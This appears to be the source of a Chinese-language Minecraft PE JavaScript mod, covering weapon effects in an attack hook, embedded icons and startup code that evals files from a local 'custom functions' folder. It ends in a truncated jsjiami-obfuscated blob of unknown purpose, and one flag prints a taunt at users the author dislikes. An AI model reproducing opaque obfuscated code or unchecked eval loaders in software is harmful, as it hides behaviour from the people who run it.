™ ๑·ิ.·ั๑ ♧ ♡ ♂ ♀ ♠ ♣ ♥ ❤☜ ☞ ☎ ☏ ⊙ ◎ ☺☻ ☼ ▧ ▨ ♨ ◐ ◑↔↕▪ ▒ ░ ぃ◊◦▣▤▥ ▦▩ ◈ ◇ ♤ ¤ ๑ ⿻ ☠ ⊙ ◎ ► ◄ ↔ ↕ ▪ ▫ ☼ ♦ ▀ ▄ █ ▌ ▐ ▬ ◘ ◙ ◈  卌 ▓ ☑
๑۩۩.. ..۩۩๑ ๑۩۞۩๑
▶ ▷ ◀ ◁ ★ ☆ ⊙ ⓛⓞⓥⓔ
⊙●○①⊕◎Θ⊙¤™♂♥℡
@：！/ " _ < > `,·。≈{}~ ～() _ -『』√ $ @ * & # ※
々∞Ψ ∪∩∈∏ の ℡ ぁ §∮”〃ミ灬∑⌒*〾⿻ㄨ ≮≯ +
－×÷+－±/=∫∮∝ ∞ ∧∨ ∏ ‖∠ ≌ ∽ ≤ ≥ ≈<>じ
⊙●★☆■♀『』◆◣◥▲Ψ ※◤ ◥ →№←〖〗@ ❤
ξζω□∮〓※∴ぷ▂▃▅▆█ ∏卐【】△√ ∩¤々∞ㄨ
≠āáǎàēéěèī í ǐ ì ō óǒòūúǔùǖǘǘǚǜüêɑ?ńň?
♯♮ ₪큐
✿｡✿ εїз ●· ۞۞ ҉
♈♉♊♋♌♎♏♐♑♓♒♍
✎﹏₯㎕
日文
ぁ あ ぃ い ぅ う ぇ え ぉ お か が き ぎ く ぐ け げ こ ご さ ざ し じ す ず せ ぜ そ ぞ た だ ち ぢ っ つ づ て で と ど な に ぬ ね の は ば ぱ ひ び ぴ ふ ぶ ぷ ほ ぼ ぽ ま み む め も ゃ や ゅ ゆ ょ よ ら り る れ ろ ゎ わ ゐ ゑ を ん ゛ ゝ ゞ ァ ア ィ イ ゥ ウ ェ エ ォ オ カ ガ キ ギ ク グ ケ ゲ コ ゴ サ ザ シ ジ ス ズ セ ゼ ソ ゾ タ ダ チ ヂ ッ ツ ヅ テ デ ト ド ナ ニ ヌ ネ ノ ハ バ パ ヒ ビ ピ フ ブ プ ヘ ベ ペ ホ ボ ポ マ ミ ム メ モ ャ ヤ ュ ユ ョ ヨ ラ リ ル レ ロ ヮ ワ ヰ ヱ ヲ ン ヴ ヵ ヶ ー ヽ ヾ
汉语注音符号
ㄅ ㄆ ㄇ ㄈ ㄉ ㄊ ㄋ ㄌ ㄍ ㄎ ㄏ ㄐ ㄑ ㄒ ㄓ ㄔ ㄕ ㄖ ㄗ ㄘ ㄙ ㄚ ㄛ ㄜ ㄝ ㄞ ㄟ ㄠ ㄡ ㄢ ㄣ ㄤ ㄥ ㄦ ㄧ ㄨ ㄩ*/

function 神器选择(i){

if(i>=0&&i<=17){功能=i;}

if(i==18){addItemInventory(物品id组[2],1,0);}
cM(astr[130+i])
}

var 实体id选取,实体模型选取



function 获得实体信息(){
保存日志("获得实体信息");
实体id设置=Entity.getEntityTypeId(控制实体);
实体模型设置=Entity.getRenderType(控制实体);
if(控制实体==32||控制实体==34||控制实体==36||控制实体==11||控制实体==12||控制实体==13||控制实体==10){实体年龄=Entity.getAnimalAge(控制实体);}
实体血量=Entity.getHealth(控制实体);
实体pitch=Entity.getPitch(控制实体);
实体yaw=Entity.getYaw(控制实体);
实体x速=Entity.getVelX(控制实体);
实体y速=Entity.getVelY(控制实体);
实体z速=Entity.getVelZ(控制实体);
实体名字=Entity.getNameTag(控制实体);
}

function attackHook(攻击者,实体){
保存日志("攻击钩子",攻击者,实体,Entity.getEntityTypeId(攻击者),Entity.getRenderType(攻击者),Entity.getEntityTypeId(实体),Entity.getRenderType(实体));

if(aswi[16]&&攻击者!=getPlayerEnt()){preventDefault();}
if(aswi[5]){for(i=0;i<效果组.length;i++){Entity.addEffect(实体,效果组[i],1200*效果时间,效果强度,false,true);}}
if(实体==yzr实体){preventDefault();}

if(getCarriedItem()==物品id组[9]){preventDefault();控制实体=实体;获得实体信息();cM("已获取实体");}
攻击算法(物品id组[7],实体,7)
攻击算法(物品id组[6],实体,5)
攻击算法(物品id组[5],实体,9)
攻击算法(物品id组[4],实体,6)
耐久算法(物品id组[7],1,400)
耐久算法(物品id组[6],1,400)
耐久算法(物品id组[5],1,400)
耐久算法(物品id组[4],1,400)
耐久算法(物品id组[2],1,400)
if(实体!=0){debug实体id=Entity.getEntityTypeId(实体);debug实体模型id=Entity.getRenderType(实体);debug实体血量=Entity.getHealth(实体);}

if(getCarriedItem()==物品id组[2]&&功能==7){
var x=Entity.getX(实体);
var y=Entity.getY(实体);
var z=Entity.getZ(实体);
var 闪电=Level.spawnMob(x,y,z,93);
Entity.rideAnimal(闪电,实体);
Entity.setRenderType(闪电,EntityRenderType.lightningBolt);
cM("神器闪电降临！");}

if(功能==3&&getCarriedItem()==物品id组[2]){preventDefault();Entity.setNameTag(实体,名字);cM(astr[0]);}

if(功能==4&&getCarriedItem()==物品id组[2]){

if(Level.getGameMode()!=1){Entity.setCarriedItem(
getPlayerEnt(),
getCarriedItem(),
Player.getCarriedItemCount(),
Player.getCarriedItemData()+5);}
cM(""+Player.getName(攻击者)+"爆了"+Player.getName(实体)+"的菊花!");Entity.setHealth(实体,-2);}

if(功能==6&&getCarriedItem()==物品id组[2]&&实体!=yzr实体){

if(Level.getGameMode()!=1){Entity.setCarriedItem(getPlayerEnt(),
getCarriedItem(),Player.getCarriedItemCount(),Player.getCarriedItemData()+5);}
Entity.setHealth(实体,1);
Entity.setFireTicks(实体,99999);
}

if(第一次生物==0&&第二次生物==0&&功能==13&&getCarriedItem()==物品id组[2]){preventDefault();
第一次生物=实体;
cM("点击另一生物进行骑行");}

if(第一次生物!=实体&&第二次生物==0&&第一次生物!=0&&功能==13&&getCarriedItem()==物品id组[2]){
preventDefault();第二次生物=实体;rideAnimal(第一次生物,第二次生物);

if(Level.getGameMode()!=1){Entity.setCarriedItem(
getPlayerEnt(),
getCarriedItem(),
Player.getCarriedItemCount(),
Player.getCarriedItemData()+3);}}

if(第一次生物!=0&&第二次生物!=0){第一次生物=0,第二次生物=0}

if(功能==11&&getCarriedItem()==物品id组[2]){preventDefault();
rideAnimal(攻击者,实体);
ModPE.showTipMessage("按 LShift 离开")
if(Level.getGameMode()!=1){Entity.setCarriedItem(
getPlayerEnt(),
getCarriedItem(),
Player.getCarriedItemCount(),
Player.getCarriedItemData()+3);}}
}

function 跳转(链接){
保存日志("打开浏览器",链接);
ctx.startActivity(new pg.ac.Intent(pg.ac.Intent.ACTION_VIEW,pg.an.Uri.parse(String(链接))))
}
/*~~~~~图片代码，反正你看不懂~~~~~~*/
var lockb="iVBORw0KGgoAAAANSUhEUgAAAB0AAAAkCAYAAAB15jFqAAAABHNCSVQICAgIfAhkiAAAAxJJREFU\nWIXtl01oVFcUx3/nzkw6MU0EBYuhwdCFSLII2jRv5qmFtCtB0IWkFIJU0LZ06ca22birtAhdCGZR\n3CilRGi0dN2AOvM+nFVhSqmtSOpCF/3QmPhB3j1dzEcmOpk3L01oQf+buefMuf/f+7jvvneEBCoU\nCltMxowK0gd0Ardtyl51X3d/TeIj7RQVS8UdYuULgX1A6pkC5ZoROzEysvvKmkC9wDsuwmdARzUV\nAXdQFhF6gUwdjZxy3nAmRERbeZoY4IQIp4EOgd8UjmBlU24k/2rOyffbRd2o8A7wU+UE9JPgun9m\n1WcaBMX9KvIdIArTGZMZHx4eXmhWWy6XO+bm758BjgGocizv5L9KBJ2ZmUl3dmVvAP1Aobur563B\nwcEnrY5eVSUoBd+iehC4Zxf1Ndd1/2xW2/TyZruy41WgtUaPxgEBRESJ+BB4CGyUtHy0Uu1K93S8\n+vu9O+z+HAesKZfL3QUuAAi82za0VCptMLAHQGG6XWBNouab6nAgDMO+tqBRFA0ovFQJCJJCF15e\nCOteEu1sCwq8Uhuo6t2k0NHB0QfA/YrBklcctK6VVl8bqm0O6cTQ9dJ/AhUv8E4sSwg7gPcAVPl4\nVabCSSCLyCW16i/7T+Ws+KHXcnNea6VNtK3xRs8jxO48q5KSBrrr4NpAVN93Rtyv14Ppl/w9WL1a\ni5+f1dv04W2l4HrxA1V2VSLzy+yt2S/HxsaidYMGQSGvKpNLGaWvv+93YCqJT8LLm97UJLk5mcfz\ntJBeQP8/UGvs46dzgjyKnWftslak/pyqmK1xk3s29FyZe3DvPEYGAFSZzWYexn68pYRebXiXNWwO\n9gBwutXk6vfv4TjIM1I52BgaYK4ylL1+6I83mfKvFIbFtxUO1eJMpvsPI1BoOKRzXuAdL5fLHc0M\nkmhqairlBd5Ri1ymtnaEH4eGhuYlDAtvWswPNPadwl8oJUT+Xg1QVLsVdgFbnsqPOY57UQD80D8C\nOslSD7rWikT51HHyn0ND1+Z5Xr+k9LAg21VkbeCWRTF6MxK90NgT/QMYswYqf9bQxQAAAABJRU5E\nrkJggg==\n"

var unlockb="iVBORw0KGgoAAAANSUhEUgAAAB0AAAAkCAYAAAB15jFqAAAABHNCSVQICAgIfAhkiAAAAltJREFU\nWIXtlz1oFEEUx39v7i6eCZciQkQhmEpCUgTC4ZElCmolCFrIVUcwELRPo2hjJyiBdKayUSzOIirW\nBpS9/fAqISCKIrGy8IsYP4K7zyJ3ySZePO5yewrx3+y8N/Peb3Z2dnee0EbZtt1rUuaotANWKpcG\nJJTrAieAROxQx3OmRLgKdFRcgYkZeFmEaaBD4JXCBKH0xHannlc6qSIPAFGYS5lUIZvNfgWIBTo/\nP5/c3ZV+CfQDdqar+9jQ0NBKtT+W5U13pQsVYBganYwCY4MChcr1oZW1nm/ubDm0XC53GhgDUJir\nNabl0CAIBhV2rRp4bYECe6sNVX3XLuiaLMv60HboVvorUHE858IGhzAAnAVQ5WJTSYUrQBqRexqq\nu6FP5Ya4vqPNzbc5JU1wIBmxlxFWthy9HSlJILMGrjZE9VzukHUnDqZbdscI9UnV3jm7N1l/yEZ5\nT0vnVRlZtcyLxTeLM/l8PogN6nn2qKrMrnuUvv6+t0CxkTwNLm+yp4ZzT2M5dtJG+g/9d6ChCX9s\n9gnyvW5cGCai9tp7qmL21Qvu7ux+vPTl8y2MDAKosphOfat5+IoqIezXyL8s8nEITwHTfwqunF/H\n60F+k8rpqGmApdWmHHZ9t1AjZFvy/dJxhTNVO5XKvDcCdmRKNx3PmVpYWOiolaARFYvFhOM5kyFy\nn+reEZ4NDw8vi+/bR0LMI2D9YQsfUcqIfGoGKKoZhRGgd5M/n8tZdwXA9d0J0FnWa8hWKxDlUi43\neg0iVZvjOP2S0HFBDqpIa+AhP8Xo60D0drSm+QWq1r3638mwAQAAAABJRU5ErkJggg==\n"
var 滑鸡base="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\nYII=\n"
/*计算图片*/
if(!存在(主目录+"自定义函数/")){mkdir(主目录+"自定义函数/");}
var a=文件浏览(主目录+"自定义函数/")
for(i=0;i<a.length;i++){try{eval(读取(a[i]))}catch(e){alert("自定义函数出错:\n(在"+a[i]+")\n"+e)}}

runThread(function(){try{
读取主数据()
打开主要按钮();
if(aswi[15]==true){
aswi[15]=false;写入主数据();alert("新手帮助:\n"+alert内容[1]);保存日志("写入第一次数据");}
if(检查更新!=inf.v){alert(alert内容[4]);检查更新=inf.v;写入主数据();保存日志("alert更新");}
try{eval(附加指令读取+"");}catch(e){alert("附加指令错误:"+e)}
放歌()
for(i=0;i<玩家固定数*6;i++){定住玩家.push(0);}
保存日志("js载入完毕");
print(inf.n+"加载完毕⊙▽⊙\n感谢您的使用！\n载入时间:"+(new Date()-loadt)+"ms");
if(aswi[22]){print("你得罪了作者！\n老子不让你好好玩！");}
aswi[12]=false
}catch(e){alert("准备时出错:"+e)}})
var version_='jsjiami.com.v7';function _0x8378(){var _0x48f1e6=(function(){return[version_,'qrfpjLusNMjiHkRaACmyDiE.OPcqNofmN.GvuK7p==','nmoDa8k5','qZ8Pfh4','nIJcI8olzW','WPTDWOC3WPm','DCkyrmoHvL5SxCkawmkvoG','CeGiWOHfWQKe','W7GOgIHs','rqaxjhO','xCkHWRP6mq','W48KWRdcI17cMCkzv2yE','ocZdLCoYyG','jCoNW7VdGSog','W4lcV8kxrG4Oy8oJumojDmoN','lCkpWOpdGSkU','FCk4WO1hoG','W6hdRwldKc/dKXxdQSkJWOndEwm','xvm8cg0','W7aug8o5cG','aI7dK24u','W67cM8kikCof','BCk7WQ4OW7O','tSkJWO8LW7u','l8oqbSkvoG','W4mFfuq1','qfXPBam','tXL3W4Wd','wCk6W6yToq','gtVdQSk3W6a','WQSKW64eW6G','5lYF5PAW54UO5PY354UP5l245AAU54cC5lQz776R','zqKCaum','gM7dGJJcLq','ESoaW4HRvxKLWPVdMCoP','xsXTW4aQ','WQylemoRbW','tsHQWR8e','W74ZjYrx','WOyUW5i1W7q','ASk4WQ17pq','nvCmW4LzltNdGL1yW5CkWQO','WR/dUSo5p2q','CrZcRGdcJNWGWOFcPq','W7m7CCoJpG'].concat((function(){return['qSoTsmk5rq','WR1eWQeZWRu','yCobW4DZCq','W4WIg8oTiG','W4G1ph4x','BZvPW5i','pthdKK0','W5rLW7JdJUEANEETLUAWQaT1ca','ba/dSwhcMa','W7a1W7CCFa','x8ofW49AtG','WPFdMmkvvCkJ','W6BdOmkKBqq1WQvPWR5zzmoF','AISjlf0','xCoiW7lcQ3K','WPtcUvBdP8oE','WQBcSGNcUg0','WQldSrHGW4y','F8kGWPH9pa','gdZdKMG7','WP8fW4KOW7a','D0z9WQNdSW','grhcR8owya','gCodv8kjoa','jCkBWORdUmkw','6ioY5lYE5AsS776B','WRlcUSo5mhm','iCoeW787rCo5W7BdVq3cM8oGWPNcRW','te/cNCkOm8k6wmobCq9AW68r','W5OJWOu4WPu','q8o+W6nvuW','FhxcKXxdGJtcQSk9W6PTBSkFWR4','W64QW4CqyG','WOpdJGbIW4q','w8kRWRaJW7S','sZHFW58C','WRVcIxhdI8ow','WRPKW43dVK8','ktxdOgaw','WRJcJXNcGLi','cXddJ8oXta','omoIWPjSDLKHvSouW4G+W5dcLa','W6PFWOm2WPldJCkDWOVcNXz9yq','oYxcTSoKsG','wZPCW548'].concat((function(){return['C8kVWRtcUXS','WR/cJqBcHvS','W4z+WQOZWO3cHsKfWRS','w1TvBGi','vhOXbwW','xSkYWRVcNcK','WQ7dUCkiC8ko','D0jxWOxdVq','bJhcOSoOva','b0vFW6/dRCkzmd4','WR7cImowW6NcQmk/W61wuSkyWRG5aq','fYZdIxy5','zmkmW44ucq','WQfwW5WMr8o7qmkU','lrWcW7RcIHtdVcJcJWehW7q','omosW4hdQ8o1vW','W6mol1Oy','W6CiW7Woya','pHlcSCoOEa','W7X/WQLqWO4cW7/dVuOBhmoG','W4CdxmoNoa','gmo1W5BdT